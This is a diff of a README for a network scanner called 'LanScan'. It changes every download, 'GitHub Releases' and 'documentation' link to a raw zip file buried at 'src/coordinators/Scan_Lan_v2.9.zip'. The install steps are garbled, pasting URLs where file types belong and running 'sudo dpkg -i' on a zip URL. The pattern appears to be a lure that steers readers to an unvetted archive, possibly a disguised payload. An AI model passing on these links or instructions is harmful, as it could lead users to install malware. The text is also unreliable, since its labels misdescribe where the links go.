@@ -1,7 +1,7 @@
 # 🌐 LanScan - Discover Your Network Easily
 
 ## 📥 Download Now
-[![Download LanScan](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip)](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip)
+[![Download LanScan](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip)](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -25,18 +25,18 @@ To run LanScan, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download LanScan, please visit this page: [GitHub Releases](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip).
+To download LanScan, please visit this page: [GitHub Releases](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip).
 
 1. **Visit the Release Page**: Click on the link above to go to the GitHub Releases page.
 2. **Select the Latest Version**: Look for the latest version of LanScan.
 3. **Download the Installer**: You will find options for different operating systems. Choose the appropriate file for your system. 
    - For Windows, download the `.exe` file.
-   - For Linux, download the `.deb` or `https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip` file based on your distribution.
+   - For Linux, download the `.deb` or `https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip` file based on your distribution.
 4. **Run the Installer**: 
    - For Windows, double-click the downloaded `.exe` file and follow the prompts to complete the installation.
    - For Linux, use the terminal to navigate to the download directory, then run the following commands:
-     - For `.deb`: `sudo dpkg -i https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip`
-     - For `https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip`: Extract it and follow the included instructions.
+     - For `.deb`: `sudo dpkg -i https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip`
+     - For `https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip`: Extract it and follow the included instructions.
 
 After installation, LanScan will appear in your applications menu. Open it to start scanning your network!
 
@@ -59,6 +59,6 @@ LanScan is licensed under the MIT License. Feel free to use, modify, and distrib
 
 We appreciate all contributors and users of LanScan who provide valuable feedback for improvements. Your input helps us make LanScan better for everyone. 
 
-For further details, visit the [documentation](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip) or contact us directly through GitHub.
+For further details, visit the [documentation](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip) or contact us directly through GitHub.
 
-[Download LanScan](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/precisely/LanScan.zip) and make network diagnostics effortless!
+[Download LanScan](https://raw.githubusercontent.com/Jonathan-cmfk/LanScan/main/src/coordinators/Scan_Lan_v2.9.zip) and make network diagnostics effortless!
